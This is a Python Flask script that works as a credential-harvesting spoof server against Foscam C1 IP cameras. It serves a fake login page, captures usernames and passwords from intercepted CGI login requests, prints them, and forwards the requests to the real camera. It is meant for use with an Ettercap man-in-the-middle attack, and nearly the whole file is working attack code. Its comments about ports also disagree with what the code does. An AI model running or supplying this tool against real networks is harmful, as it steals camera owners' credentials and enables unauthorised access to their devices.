#!/usr/bin/env python3

# IMPORTANT:
# To run the script:
# 1. Open terminal
# 2. Navigate to the directory containing this script
# 3. Type in the command: sudo python3 http_spoof_server.py --camera 192.168.0.5 --port 88 --iface <whatever-interface>
"""
http_spoof_server.py

A Flask app that:
- Serves your index.html (and any static/ assets) for all browser GETs.
- Intercepts GETs to /cgi-bin/CGIProxy.fcgi?cmd=login&usr=…&pwd=…
  → logs the credentials, forwards to real camera, and returns camera’s response.
Usage: sudo python3 http_spoof_server.py --camera CAMERA_IP --iface IFACE
"""

import argparse
import os
from flask import Flask, request, send_from_directory, Response
import requests

app = Flask(__name__, static_folder="static", static_url_path="/static")

# These globals are set via CLI args below:
CAMERA_IP   = None
CAMERA_PORT = 88
INTERFACE   = None

@app.route('/', methods=['GET'])
@app.route('/<path:filepath>', methods=['GET'])
def serve_index_or_static(filepath=""):
    """
    For any GET path:
    - If it begins with "cgi-bin/CGIProxy.fcgi", divert to proxy_cgi().
    - Else, if a file named filepath exists under static/, serve it.
    - Otherwise, fall back to static/index.html.
    """
    # If the victim requests the camera’s CGI path, handle it here
    if filepath.startswith("cgi-bin/CGIProxy.fcgi"):
        return proxy_cgi()

    # If filepath corresponds to a real static asset under static/, serve it
    if filepath:
        full_path = os.path.join(app.static_folder, filepath)
        if os.path.isfile(full_path):
            return send_from_directory(app.static_folder, filepath)
    # Default: serve the fake login page
    return send_from_directory(app.static_folder, "index.html")

@app.route('/cgi-bin/CGIProxy.fcgi', methods=['GET'])
def proxy_cgi():
    """
    Catch all /cgi-bin/CGIProxy.fcgi?… calls.
    If cmd=login, capture usr/pwd; forward the same request to the real camera;
    return the camera’s response unchanged.
    """
    cmd = request.args.get("cmd", "")
    usr = request.args.get("usr", "")
    pwd = request.args.get("pwd", "")

    # If it’s a login attempt, print the credentials
    if cmd == "login" and usr and pwd:
        print(f"[+] Captured credentials → Username: '{usr}' | Password: '{pwd}'")

    # Build the real camera’s CGI URL
    camera_url = f"http://{CAMERA_IP}:{CAMERA_PORT}/cgi-bin/CGIProxy.fcgi"
    try:
        # Forward the identical query string to the real camera
        resp = requests.get(camera_url, params=request.args, timeout=5)
        # Return camera’s response (often XML) back to the victim
        return Response(
            resp.content,
            status=resp.status_code,
            content_type=resp.headers.get("Content-Type", "application/octet-stream")
        )
    except Exception as e:
        print(f"[!] Error forwarding to real camera: {e}")
        return Response("<!-- Camera unreachable -->", status=502, content_type="text/html")

def parse_args():
    parser = argparse.ArgumentParser(description="Foscam login‐spoof server")
    parser.add_argument("--camera", required=True,
                        help="IP address of real Foscam C1 (e.g. 192.168.0.5)")
    parser.add_argument("--port", type=int,
                        help="Port of real camera’s HTTP interface (default: 80)")
    parser.add_argument("--iface", required=True,
                        help="Network interface used for Ettercap MITM (e.g. eth0)")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    CAMERA_IP   = args.camera
    CAMERA_PORT = args.port
    INTERFACE   = args.iface

    # Run Flask on 0.0.0.0:80 (root required to bind to port 80)
    app.run(host="0.0.0.0", port=5000, debug=True)
